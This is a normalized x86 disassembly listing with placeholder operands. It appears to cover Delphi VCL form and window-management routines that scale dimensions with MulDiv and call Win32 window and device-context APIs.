cmp [ eax + 0x1c ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_458120
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
sub_458574
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax ebx
call sub_43fe0c
mov edx [ ebx + 0x20c ]
mov edx [ edx + 0x10 ]
call sub_42a4e0
push eax
lea eax [ esp + 0x4 ]
push eax
mov eax ebx
call sub_43fdc8
mov edx eax
mov edi [ ebx + 0x208 ]
mov eax [ edi + 0x10 ]
call sub_42a4e0
mov ecx eax
mov eax [ ebx + 0x20c ]
mov edx [ eax + 0xc ]
neg edx
mov eax [ edi + 0xc ]
neg eax
call sub_418e2c
push esi
mov edi esi
lea esi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov edx esi
mov eax ebx
call sub_442c18
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_4585e4
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_458645
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_4033d8
test al al
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_445f28
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45864c
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x4 ] edx
retn
mov eax [ ebp - 0x8 ]
mov [ eax + 0x4 ] 0x1
sub_458674
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
xor ebx ebx
mov [ ebp - 0x114 ] ebx
test dl dl
je r-xdata
mov ebx ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4587d8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_4587b8
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
mov ecx ebx
xor edx edx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xe0 ]
mov eax [ ebp - 0x4 ]
call sub_403194
cmp eax [ r-xdata ]
je r-xdata
add esp 0xfffffff0
call sub_403570
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4587bf
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
or [ eax + 0x2f4 ] 0x1
xor eax eax
push ebp
push sub_458780
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_419ff8
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfe
retn
lea edx [ ebp - 0x110 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_40319c
lea eax [ ebp - 0x110 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x4
lea eax [ ebp - 0x10 ]
push eax
push 0x0
lea edx [ ebp - 0x114 ]
mov eax [ rw-data ]
call sub_405eac
mov ecx [ ebp - 0x114 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b974
call sub_4039d8
sub_458800
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x234 ] 0x0
jne r-xdata
test [ ebx + 0x2f4 ] 0x20
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd4 ]
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb3
call sub_403448
and [ ebx + 0x2f4 ] 0xdf
sub_458838
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_457e44
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
xor edx edx
mov eax ebx
call sub_43fb34
xor edx edx
mov eax ebx
call sub_43fb58
mov edx 0x140
mov eax ebx
call sub_43fb80
mov edx 0xf0
mov eax ebx
call sub_43fba4
mov dl 0x1
mov eax [ r-xdata ]
call sub_429a74
mov esi eax
mov [ ebx + 0x240 ] esi
push 0x31
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
push 0x32
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax [ ebx + 0x240 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebx + 0x240 ]
mov [ eax + 0x14 ] ebx
mov [ eax + 0x10 ] sub_459154
mov dl 0x1
mov eax [ r-xdata ]
call sub_423870
mov esi eax
mov [ ebx + 0x238 ] esi
mov eax esi
mov edx ebx
call sub_43efa0
mov al [ r-xdata ]
mov [ ebx + 0x228 ] al
mov [ ebx + 0x229 ] 0x2
mov [ ebx + 0x22b ] 0x0
mov [ ebx + 0x231 ] 0x3
mov [ ebx + 0x244 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov [ ebx + 0x25c ] eax
mov [ ebx + 0x235 ] 0x1
mov eax ebx
call sub_403194
mov [ ebx + 0xb8 ] eax
mov [ ebx + 0x2e1 ] 0xff
xor eax eax
mov [ ebx + 0x2ec ] eax
xor edx edx
mov eax ebx
call sub_4594b8
xor edx edx
mov eax ebx
call sub_440588
xor edx edx
mov eax ebx
call sub_4404f0
mov dl 0x1
mov eax ebx
call sub_446d24
mov edx ebx
mov eax [ rw-data ]
call sub_45db1c
mov [ ebx + 0x2e4 ] 0xa
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403570
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
call sub_4035c8
pop [ fs : 0x0 ]
add esp 0xc
sub_4589b1
add [ eax ] al
add [ ebx - 0x75 ] dl
fsub [ ecx + rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov eax ebx
call sub_41fe78
mov eax [ rw-data ]
mov eax [ eax + 0x7c ]
mov edx ebx
call sub_41a37c
xor edx edx
mov eax ebx
call sub_41cdfc
cmp [ ebx + 0x264 ] 0x0
je r-xdata
cmp [ ebx + 0x22f ] 0x1
je r-xdata
mov eax [ ebx + 0x264 ]
mov edx [ eax ]
call [ edx + 0xc ]
cmp [ ebx + 0x234 ] 0x0
jne r-xdata
mov eax ebx
call sub_45c9c4
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd8 ]
sub_458a1c
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_4035d8
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
xor eax eax
push ebp
push sub_458ae6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x234 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_45b340
mov eax [ ebp - 0x4 ]
call sub_446ee8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xd8 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_45db54
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
call sub_40324c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x240 ]
call sub_40324c
mov eax [ ebp - 0x4 ]
add eax 0x2f0
call sub_40d420
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_457ebc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_458aed
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xac ]
sub_458b00
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2d2 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x2
je r-xdata
xor eax eax
push ebp
push j_sub_4036ec#9
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2d4 ]
call [ ebx + 0x2d0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_4594b8
sub_458b46
mov eax [ ebp - 0x4 ]
mov si 0xffad
call sub_403448
test al al
jne r-xdata
call sub_403a54
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x2
je r-xdata
call sub_403a00
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_4594b8
sub_458b7c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2da ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
xor eax eax
push ebp
push sub_458bbd
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2dc ]
call [ ebx + 0x2d8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_458bdc
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_442480
mov eax [ ebx + 0x220 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi eax
xor eax eax
mov [ ebx + 0x220 ] eax
mov eax edi
mov si 0xffb8
call sub_403448
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_45ae84
sub_458c18
push ebx
push esi
push edi
push ebp
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_43f894
mov eax ebx
sub al 0x1
jb r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4033d8
test al al
je r-xdata
je r-xdata
test [ edi + 0x1c ] 0x1
jne r-xdata
cmp [ edi + 0x2f0 ] 0x0
jne r-xdata
mov ebp [ edi + 0x2f0 ]
test ebp ebp
je r-xdata
jmp r-xdata
cmp [ edi + 0x250 ] 0x0
je r-xdata
cmp [ edi + 0x248 ] 0x0
jne r-xdata
mov edx esi
mov eax [ edi + 0x2f0 ]
call sub_41a0dc
jmp r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40321c
mov [ edi + 0x2f0 ] eax
cmp esi [ edi + 0x248 ]
jne r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4033d8
test al al
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov ecx ebx
mov edx esi
mov eax [ edi + 0x250 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp edi [ esi + 0x4 ]
jne r-xdata
cmp esi [ edi + 0x258 ]
jne r-xdata
xor edx edx
mov eax edi
call sub_45a27c
mov edx esi
mov eax ebp
call sub_41a37c
jmp r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4033d8
test al al
je r-xdata
cmp esi [ edi + 0x260 ]
jne r-xdata
xor edx edx
mov eax edi
call sub_45a254
mov edx esi
mov eax edi
call sub_45a27c
jmp r-xdata
xor edx edx
mov eax edi
call sub_45a230
sub_458d22
mov eax eax
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_443444
xor edx edx
push ebp
push sub_458f7a
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x268 ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x26c ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x270 ] edx
xor ebx ebx
mov al [ rw-data ]
xor al 0x1
mov edx [ ebp - 0x4 ]
mov [ edx + 0x234 ] al
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_442ba0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x25c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x268 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x270 ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
test eax eax
jle r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_43fde0
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x10
je r-xdata
mov eax [ ebp - 0x4 ]
mov dl [ r-xdata ]
mov [ eax + 0x98 ] dl
test bl bl
jne r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_43fe24
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x25c ] eax
mov eax [ ebp - 0x4 ]
call sub_4590ac
mov esi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
cmp esi eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x25c ]
mov edx [ rw-data ]
cmp eax [ edx + 0x40 ]
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax [ ebp - 0x4 ]
call sub_441578
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_458f81
mov eax [ ebp - 0x4 ]
call sub_44344c
retn
mov ecx 0x1
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_458384
mov ecx 0x1
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_446670
mov bl 0x1
mov ecx eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_458384
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x270 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_446670
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x25c ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x68 ]
mov eax esi
call sub_423134
push eax
call MulDiv
mov edx eax
mov eax esi
call sub_42313c
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x268 ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x268 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x20
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x26c ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fa ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fa ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fe ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fe ] eax
sub_458f89
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_443eec
push 0x0
push 0x0
push ebx
push sub_459090
mov cl [ ebx + 0x5e ]
xor cl 0x1
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push sub_45905c
push ebx
push sub_459074
mov cl [ ebx + 0x5e ]
xor cl 0x1
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push r-xdata
push 0x0
push 0x0
xor ecx ecx
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop edi
pop esi
pop ebx
retn
sub_45903b
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov eax esi
call sub_41d4f4
test al al
je r-xdata
pop esi
pop ebx
retn
mov dl 0x1
mov eax ebx
call sub_4404f0
sub_4590c7
inc [ ecx ]
add [ eax ] al
add [ eax ] dh
add [ eax ] al
add bl al
lea eax [ eax ]
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_458384
mov ecx edi
mov edx esi
mov eax ebx
call sub_446670
mov eax ebx
call sub_4591b0
test al al
je r-xdata
push edi
push esi
mov ebp [ ebx + 0x68 ]
mov eax ebp
call sub_4231d8
push eax
call MulDiv
mov edx eax
mov eax ebp
call sub_4231f4
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_43fe0c
mov ebp eax
push edi
push esi
mov eax ebx
call sub_43fdc8
push eax
call MulDiv
mov edx eax
mov eax ebx
call sub_459458
push edi
push esi
push ebp
call MulDiv
mov edx eax
mov eax ebx
call sub_459488
sub_459154
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax ebx
call sub_446be4
push eax
call IsIconic
test eax eax
je r-xdata
mov eax ebx
call sub_446ee8
test al al
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
cmp [ ebx + 0x229 ] 0x3
je r-xdata
mov eax ebx
call sub_45b4b4
push eax
push 0x1
push 0x80
mov eax ebx
call sub_446be4
push eax
call SendMessageA
pop ebx
retn
sub_4591e8
push ebx
mov ebx eax
mov eax ebx
call sub_45a104
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov al [ ebx + 0x229 ]
sub al 0x2
je r-xdata
mov al 0x1
sub al 0x3
je r-xdata
mov al 0x1
pop ebx
retn
xor eax eax
jmp r-xdata
cmp al [ ebx + 0x210 ]
jne r-xdata
sub_45927c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_446be4
push eax
call IsIconic
test eax eax
je r-xdata
mov edx esi
mov eax ebx
call sub_446cac
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0x0
push 0x0
push esi
call SetRect
push 0xffffffec
mov eax ebx
call sub_446be4
push eax
call GetWindowLongA
push eax
cmp [ ebx + 0x248 ] 0x0
setne al
neg al
sbb eax eax
push eax
push 0xfffffff0
mov eax ebx
call sub_446be4
push eax
call GetWindowLongA
push eax
push esi
call AdjustWindowRectEx
mov eax [ ebx + 0x4c ]
sub eax [ esi + 0xc ]
add eax [ esi + 0x4 ]
push eax
mov eax [ ebx + 0x48 ]
sub eax [ esi + 0x8 ]
add eax [ esi ]
push eax
push 0x0
push 0x0
push esi
call SetRect
pop esi
pop ebx
retn
sub_459302
mov eax eax
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov edx esi
mov eax ebx
call sub_447188
cmp ebx esi
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
mov eax ebx
call sub_4201fc
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
mov edx edi
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4201d0
mov edi eax
mov eax edi
mov si 0xfff1
call sub_403448
test al al
jne r-xdata
sub_459370
push ebx
push esi
mov ebx eax
cmp [ ebx + 0xa0 ] 0x0
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov esi eax
mov eax ebx
call sub_403194
cmp esi eax
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_45939c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov ebp eax
mov eax [ esp ]
mov edx [ r-xdata ]
call sub_4033d8
test al al
je r-xdata
mov eax ebp
call sub_4438dc
sub [ esp + 0x4 ] eax
mov [ esp + 0x8 ] 0xffffffff
mov eax ebp
call sub_4201fc
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov eax ebp
call sub_4471d0
jmp r-xdata
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
inc [ esp + 0x8 ]
mov eax [ esp + 0x8 ]
cmp eax [ esp + 0x4 ]
jne r-xdata
mov edx edi
mov eax ebp
call sub_4201d0
mov si 0xfff1
call sub_403448
test al al
jne r-xdata
mov edx edi
mov eax [ esp ]
call sub_42020c
jmp r-xdata
sub_459430
push ebx
mov ebx eax
cmp dl [ ebx + 0x60 ]
je r-xdata
pop ebx
retn
mov eax ebx
call sub_4405ac
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_441578
sub_459458
push ebx
mov ebx eax
test [ ebx + 0x54 ] 0x8
je r-xdata
mov eax ebx
call sub_43fde0
pop ebx
retn
mov [ ebx + 0x268 ] edx
mov al [ r-xdata ]
or al [ ebx + 0x98 ]
mov [ ebx + 0x98 ] al
pop ebx
retn
sub_459488
push ebx
mov ebx eax
test [ ebx + 0x54 ] 0x8
je r-xdata
mov eax ebx
call sub_43fe24
pop ebx
retn
mov [ ebx + 0x26c ] edx
mov al [ r-xdata ]
or al [ ebx + 0x98 ]
mov [ ebx + 0x98 ] al
pop ebx
retn
sub_4594b8
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi + 0x2f4 ] 0x1
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
mov edx ebx
mov eax esi
call sub_4402e4
cmp bl [ esi + 0x57 ]
je r-xdata
and [ esi + 0x2f4 ] 0xfd
pop esi
pop ebx
retn
or [ esi + 0x2f4 ] 0x2
jmp r-xdata
mov eax esi
call sub_45a5f0
pop esi
pop ebx
retn
sub_4594fa
mov eax eax
push ebp
mov ebp esp
push 0x0
xor edx edx
push ebp
push sub_459555
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45955c
lea eax [ ebp - 0x4 ]
call sub_403f9c
retn
cmp [ eax + 0x57 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405eac
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b938
call sub_4039d8
sub_459564
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
cmp ebx esi
je r-xdata
test eax eax
jne r-xdata
mov edx esi
mov eax ebx
call sub_440298
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov eax ebx
call sub_444104
mov eax ebx
call sub_4442a0
sub_45959c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_420048
cmp [ ebx + 0x250 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax [ ebx + 0x250 ]
mov ebx [ eax ]
call [ ebx + 0x2c ]
sub_4595da
mov eax eax
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
mov edx eax
cmp edx 0x46
jg r-xdata
sub edx 0xb01a
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
dec edx
je r-xdata
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x1c ]
and ax [ r-xdata ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
add edx 0xfffffffa
sub edx 0x3
jb r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4445c0
mov eax [ ebp - 0x4 ]
mov si 0xffb3
call sub_403448
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
dec eax
sub al 0x2
jae r-xdata
cmp [ rw-data ] 0x0
je r-xdata
sub edx 0x22
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffb1
call sub_403448
jmp r-xdata
cmp eax [ rw-data ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
sub al 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22b ] 0x2
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx ] 0x7
jne r-xdata
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
cmp [ eax ] 0x1
jne r-xdata
dec edx
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb025
mov eax [ ebp - 0x4 ]
call sub_441578
push 0x0
xor ecx ecx
mov edx 0xb024
mov eax [ ebp - 0x4 ]
call sub_441578
push 0x0
xor ecx ecx
mov edx 0xb035
mov eax [ ebp - 0x4 ]
call sub_441578
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax [ ebp - 0x4 ]
call sub_441578
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax [ ebp - 0x4 ]
call sub_441578
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax [ ebp - 0x4 ]
call sub_441578
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x229 ]
sub al 0x2
je r-xdata
sub al 0x2
jne r-xdata
mov eax [ ebx + 0x8 ]
or [ eax + 0x18 ] 0x2
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov esi [ ebx + 0x8 ]
cmp [ esi ] 0x1
jne r-xdata
jmp r-xdata
mov eax [ ebx + 0x8 ]
or [ eax + 0x18 ] 0x1
jmp r-xdata
sub al 0x3
jne r-xdata
xor esi esi
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x2
jne r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x248 ]
xor ecx ecx
call sub_453658
mov edi eax
test edi edi
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_459f08
test eax eax
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_423870
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_459855
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x18 ]
push eax
call SaveDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_459838
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0xc ]
call sub_423ee8
mov eax [ rw-data ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0xc ]
call sub_423d88
mov eax [ ebp - 0x14 ]
mov ax [ eax + 0x10 ]
push eax
mov eax [ ebp - 0x14 ]
lea ecx [ eax + 0x1c ]
mov edx [ ebp - 0xc ]
mov eax edi
call sub_454be8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45983f
xor edx edx
mov eax [ ebp - 0xc ]
call sub_423ee8
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x18 ]
push eax
call RestoreDC
retn
mov edx [ esi + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x248 ]
xor ecx ecx
call sub_453658
mov edi eax
test edi edi
je r-xdata
test esi esi
je r-xdata
cmp eax [ ebp - 0x4 ]
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_459f08
call sub_446be4
mov esi eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_446be4
push eax
call GetWindowDC
